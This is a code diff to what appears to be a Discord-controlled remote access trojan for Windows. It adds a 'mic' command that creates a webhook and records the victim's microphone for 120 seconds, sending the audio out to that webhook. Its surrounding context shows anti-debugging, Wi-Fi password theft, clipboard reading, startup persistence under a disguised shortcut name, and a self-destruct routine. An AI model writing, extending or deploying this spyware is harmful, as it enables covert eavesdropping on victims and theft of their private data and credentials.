@@ -12,6 +12,7 @@ from modules.info import start
 from modules.wifi import WifiPasswords
 from pyperclip import paste
 from modules.startup import Startup
+from modules.mic import RecordMic
 
 
 if ANTIDEBUG:
@@ -796,8 +797,28 @@ async def on_message(message):
             await message.reply(embed=embed)
 
 
+#! MIC
+    elif message.content == "mic":
+        await message.reply("Creating new webhook for microphone...")
+        try:
+            webhook = await message.channel.create_webhook(name="Mic")
+            await message.reply(f"Created webhook, using URL: {webhook.url}")
+            mic_recorder = threading.Thread(target=RecordMic, args=(120, webhook.url))
+            mic_recorder.start()
+        except:
+            await message.reply(f"Failed to create new webhook!")
+            return
+        
+        await message.reply("Mic recorder enabled!")
+
+
+#! LIVE MIC
+    elif message.content == "join":
+        ...
+
+
 #SELF DESTRUCT
-    elif message.startswith("!selfdestruct"):
+    elif message.content.startswith("!selfdestruct"):
         if message.content.startswith("!selfdestruct CONFIRM"):
             #args = message.content[22:]
             shortcut_dir = f"{os.getenv('appdata')}\Microsoft\Windows\Start Menu\Programs\Startup\SystemBin_64bit.lnk"
